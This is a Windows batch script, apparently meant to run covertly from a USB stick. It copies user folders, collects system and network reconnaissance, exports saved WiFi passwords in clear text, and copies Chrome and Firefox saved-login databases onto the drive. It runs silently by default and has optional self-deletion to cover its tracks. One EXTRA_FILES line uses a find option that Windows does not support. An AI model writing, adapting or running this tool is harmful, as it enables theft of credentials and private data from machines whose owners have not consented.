@echo off
setlocal enabledelayedexpansion

:: ============================================
:: USB DATA COLLECTOR v3.0 - NO COMPRESSION
:: ============================================

:: Get USB drive letter
set "usbDrive=%~d0"
set "timestamp=%date:~10,4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%"
set "timestamp=%timestamp: =0%"

:: Load configuration
set "CONFIG_FILE=%usbDrive%\config.ini"
set "SHOW_PROGRESS=NO"
set "RECURSIVE_COPY=YES"
set "INCREMENTAL_DAYS=0"
set "SELF_DELETE=NO"
set "DELETE_VBS=NO"
set "MIN_FILE_SIZE_KB=0"
set "MAX_FILE_SIZE_KB=0"
set "EXT_FILTER="
set "EXCLUDE_FOLDERS="

:: Parse config.ini
if exist "%CONFIG_FILE%" (
    for /f "usebackq tokens=1,* delims==" %%a in ("%CONFIG_FILE%") do (
        set "%%a=%%b"
    )
)

:: Set destination folder
if defined TARGET_DRIVE if not "%TARGET_DRIVE%"=="" (
    set "dest=%TARGET_DRIVE%\CollectedData_%timestamp%"
) else (
    set "dest=%usbDrive%\CollectedData_%timestamp%"
)

:: Create log files
set "LOGFILE=%dest%\collection_log.txt"
set "ERRORLOG=%dest%\errors.txt"
set "SUCCESSLOG=%dest%\success.txt"

:: Create destination folder
if not exist "%dest%" mkdir "%dest%" 2>nul

:: Build xcopy command with options
set "backupcmd=xcopy"
if /i "%RECURSIVE_COPY%"=="YES" set "backupcmd=%backupcmd% /e"
set "backupcmd=%backupcmd% /c /h /i /r /y /q"
if %INCREMENTAL_DAYS% GTR 0 set "backupcmd=%backupcmd% /d:%INCREMENTAL_DAYS%"

:: Add size filters if specified
if %MIN_FILE_SIZE_KB% GTR 0 (
    set "backupcmd=%backupcmd% /min:%MIN_FILE_SIZE_KB%"
)
if %MAX_FILE_SIZE_KB% GTR 0 (
    set "backupcmd=%backupcmd% /max:%MAX_FILE_SIZE_KB%"
)

:: ============================================
:: START COLLECTION
:: ============================================
echo [%date% %time%] ==================================== >> "%LOGFILE%"
echo [%date% %time%] USB DATA COLLECTION STARTED >> "%LOGFILE%"
echo [%date% %time%] USB Drive: %usbDrive% >> "%LOGFILE%"
echo [%date% %time%] Destination: %dest% >> "%LOGFILE%"
echo [%date% %time%] Computer: %computername% >> "%LOGFILE%"
echo [%date% %time%] Username: %username% >> "%LOGFILE%"
echo [%date% %time%] ==================================== >> "%LOGFILE%"
echo. >> "%LOGFILE%"

:: Parse and copy folders from config
set "FOLDER_COUNT=0"
set "SUCCESS_COUNT=0"
set "FAIL_COUNT=0"

if exist "%CONFIG_FILE%" (
    for /f "tokens=1,* delims==" %%a in ('type "%CONFIG_FILE%" ^| find "=" ^| find "|"') do (
        for /f "tokens=1,2,3 delims=|" %%x in ("%%b") do (
            set "folder_name=%%x"
            set "source_path=%%y"
            set "dest_subfolder=%%z"
            
            :: Expand environment variables
            call set "expanded_source=%%source_path%%"
            
            echo [%date% %time%] Copying: !folder_name! >> "%LOGFILE%"
            echo [%date% %time%] From: !expanded_source! >> "%LOGFILE%"
            echo [%date% %time%] To: %dest%\!dest_subfolder! >> "%LOGFILE%"
            
            if exist "!expanded_source!" (
                %backupcmd% "!expanded_source!" "%dest%\!dest_subfolder!" 2>>"%ERRORLOG%" >nul
                if !errorlevel! equ 0 (
                    echo [%date% %time%] SUCCESS - Copied !folder_name! >> "%SUCCESSLOG%"
                    set /a SUCCESS_COUNT+=1
                ) else (
                    echo [%date% %time%] PARTIAL - Some files failed in !folder_name! >> "%ERRORLOG%"
                    set /a FAIL_COUNT+=1
                )
            ) else (
                echo [%date% %time%] FAILED - Source not found: !expanded_source! >> "%ERRORLOG%"
                set /a FAIL_COUNT+=1
            )
            echo. >> "%LOGFILE%"
            set /a FOLDER_COUNT+=1
        )
    )
)

:: Copy extra single files
echo [%date% %time%] Copying extra files... >> "%LOGFILE%"

if exist "%CONFIG_FILE%" (
    for /f "tokens=1,* delims==" %%a in ('type "%CONFIG_FILE%" ^| find "EXTRA_FILES" -A 20 ^| find "|"') do (
        for /f "tokens=1,2,3 delims=|" %%x in ("%%b") do (
            set "file_desc=%%x"
            set "source_file=%%y"
            set "dest_path=%%z"
            
            call set "expanded_file=%%source_file%%"
            
            if exist "!expanded_file!" (
                echo [%date% %time%] Copying: !file_desc! >> "%LOGFILE%"
                copy "!expanded_file!" "%dest%\!dest_path!" 2>>"%ERRORLOG%" >nul
                if !errorlevel! equ 0 (
                    echo [%date% %time%] SUCCESS - Copied !file_desc! >> "%SUCCESSLOG%"
                )
            ) else (
                echo [%date% %time%] WARNING - Extra file not found: !expanded_file! >> "%ERRORLOG%"
            )
        )
    )
)

:: System Information collection
echo [%date% %time%] Collecting system information... >> "%LOGFILE%"

systeminfo > "%dest%\System_Info.txt" 2>nul
ipconfig /all > "%dest%\Network_Config.txt" 2>nul
ipconfig /displaydns > "%dest%\DNS_Cache.txt" 2>nul
net user > "%dest%\User_Accounts.txt" 2>nul
net localgroup administrators > "%dest%\Admin_Accounts.txt" 2>nul
tasklist > "%dest%\Running_Processes.txt" 2>nul
tasklist /v /fo csv > "%dest%\Processes_Verbose.csv" 2>nul
driverquery /v > "%dest%\Drivers.txt" 2>nul
wmic bios get serialnumber > "%dest%\BIOS_Serial.txt" 2>nul
wmic cpu get name > "%dest%\CPU_Info.txt" 2>nul
wmic memorychip get capacity > "%dest%\RAM_Info.txt" 2>nul
wmic diskdrive get model,size > "%dest%\Disk_Info.txt" 2>nul
route print > "%dest%\Routing_Table.txt" 2>nul
netstat -an > "%dest%\Network_Connections.txt" 2>nul
arp -a > "%dest%\ARP_Table.txt" 2>nul

:: Extract saved WiFi passwords
echo [%date% %time%] Extracting WiFi profiles... >> "%LOGFILE%"
mkdir "%dest%\WiFi_Profiles" 2>nul
netsh wlan export profile key=clear folder="%dest%\WiFi_Profiles" 2>nul

:: Extract browser passwords (if Chrome/Firefox present)
echo [%date% %time%] Checking for browser data... >> "%LOGFILE%"

if exist "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" (
    copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%dest%\Browsers\Chrome_LoginData.db" 2>nul
)

if exist "%APPDATA%\Mozilla\Firefox\Profiles" (
    xcopy "%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json" "%dest%\Browsers\Firefox\" /c /h /i /r /y 2>nul
    xcopy "%APPDATA%\Mozilla\Firefox\Profiles\*\key4.db" "%dest%\Browsers\Firefox\" /c /h /i /r /y 2>nul
)

:: Create README for the collected data
(
echo ============================================
echo USB DATA COLLECTION REPORT
echo ============================================
echo Collection Date: %date% %time%
echo USB Drive: %usbDrive%
echo Computer Name: %computername%
echo Username: %username%
echo OS: %os%
echo ============================================
echo.
echo COLLECTION SUMMARY:
echo Folders attempted: %FOLDER_COUNT%
echo Successful copies: %SUCCESS_COUNT%
echo Failed copies: %FAIL_COUNT%
echo.
echo Files collected to: %dest%
echo.
echo Log files:
echo   - collection_log.txt (Main log)
echo   - success.txt (Successful copies)
echo   - errors.txt (Errors and warnings)
echo.
echo ============================================
) > "%dest%\README_COLLECTION.txt"

:: Calculate and log total size
echo [%date% %time%] Calculating total size... >> "%LOGFILE%"
for /f "tokens=3" %%a in ('dir "%dest%" /s ^| find "File(s)"') do set "TOTAL_SIZE=%%a"
echo [%date% %time%] Total size collected: %TOTAL_SIZE% bytes >> "%LOGFILE%"

echo [%date% %time%] ==================================== >> "%LOGFILE%"
echo [%date% %time%] COLLECTION COMPLETED >> "%LOGFILE%"
echo [%date% %time%] ==================================== >> "%LOGFILE%"

:: Show completion message if visible mode
if /i "%SHOW_PROGRESS%"=="YES" (
    cls
    echo ========================================
    echo DATA COLLECTION COMPLETE!
    echo ========================================
    echo.
    echo Folders processed: %FOLDER_COUNT%
    echo Successful: %SUCCESS_COUNT%
    echo Failed: %FAIL_COUNT%
    echo Total size: %TOTAL_SIZE% bytes
    echo.
    echo Data saved to: %dest%
    echo Log file: %LOGFILE%
    echo.
    echo ========================================
    timeout /t 5 /nobreak >nul
)

:: Self-delete if enabled
if /i "%SELF_DELETE%"=="YES" (
    echo [%date% %time%] Self-deleting file.bat >> "%LOGFILE%"
    del "%~f0" 2>nul
)

if /i "%DELETE_VBS%"=="YES" (
    echo [%date% %time%] Deleting visible.vbs >> "%LOGFILE%"
    del "%usbDrive%\visible.vbs" 2>nul
)

endlocal
exit /b 0